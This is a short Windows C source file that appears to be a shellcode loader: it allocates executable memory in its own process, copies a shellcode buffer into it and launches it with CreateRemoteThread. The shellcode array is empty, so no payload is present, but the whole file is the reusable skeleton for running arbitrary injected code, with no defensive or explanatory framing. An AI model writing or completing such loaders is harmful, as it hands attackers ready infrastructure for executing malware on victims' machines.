//
// Created by dev on 10/13/25.
//

#include <windows.h>

DWORD WINAPI StartProc(LPVOID val) {
    unsigned char* payload = (unsigned char*) val;
    ((void(*)())payload)();
    return 0;
}

int main () {
    unsigned char shellcode[] =
        "";

    HANDLE procHandle;

    DWORD pnameid = GetCurrentProcessId();
    procHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pnameid);

    PVOID procBuff = VirtualAllocEx(procHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(procHandle, procBuff, shellcode, sizeof shellcode, NULL);

    HANDLE procThread = CreateRemoteThread(procHandle, NULL, 0, (LPTHREAD_START_ROUTINE)StartProc, procBuff, 0, NULL);

    CloseHandle(procHandle);
    WaitForSingleObject(procThread, INFINITE);

    return 0;
}